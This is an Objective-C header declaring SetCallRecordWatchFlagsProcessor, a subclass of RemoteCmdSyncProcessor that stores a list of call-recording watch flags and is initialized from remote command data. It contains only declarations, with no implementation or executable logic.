//
//  SetCallRecordWatchFlagsProcessor.h
//  RCM
//
//  Created by Makara Khloth on 11/26/15.
//
//

#import <Foundation/Foundation.h>

#import "RemoteCmdSyncProcessor.h"

@interface SetCallRecordWatchFlagsProcessor : RemoteCmdSyncProcessor {
@private
    NSArray *mWatchFlagsList;
}

@property(nonatomic,retain) NSArray *mWatchFlagsList;

//Initialize Processor with RemoteCommandData
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData;

@end
